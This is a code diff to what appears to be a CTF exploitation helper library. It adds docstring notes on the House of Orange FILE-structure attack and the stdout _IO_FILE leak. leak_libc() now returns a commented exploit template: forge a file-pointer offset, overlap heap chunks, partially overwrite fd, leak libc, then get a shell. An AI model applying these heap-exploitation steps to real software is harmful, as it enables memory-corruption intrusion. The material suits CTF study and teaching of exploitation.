@@ -121,6 +121,7 @@ def house_of_orange():
     generate payload for house of orange
     http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html
 
+    PRICIPLE:
     IF (fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base) SATISFIED THEN 
     fp->vtable->__overflow(fp) WILL BE CALLED WHEN PARAGRAME EXIT
 
@@ -155,6 +156,7 @@ def leak_libc():
     especially usable when works with tcache
     http://4ngelboy.blogspot.com/2017/11/play-with-file-structure-yet-another.html
 
+    PRICIPLE:
     Arbitrary memory reading (fwrite)
         1. Set the _ﬁleno to the ﬁle descriptor of stdout 
         2. Set _ﬂag & ~_IO_NO_WRITES ( &= ~8)
@@ -163,4 +165,19 @@ def leak_libc():
         5. _IO_read_end equal to _IO_write_base
     '''
     # todo
-    pass
+    payload = '''offsets = pf.iofile.get_offsets(path_to_libc)
+fake_fd = p64(std_out_base + offsets['file']['_IO_write_ptr'])[:2]
+# base is 2 low bytes of stdout addr, exec p stdout to get it
+
+# first construct overlap chunk, to get main_arena's address as fd
+
+# the overwrite low two bytes of the fd to fake_fd
+
+# the malloc a chunk at stdout->file._IO_write_ptr. and enlarge the low byte 
+# then you can get libc address
+
+# then get shell
+
+# note that 4-bit brute-force is needed
+    '''
+    return payload
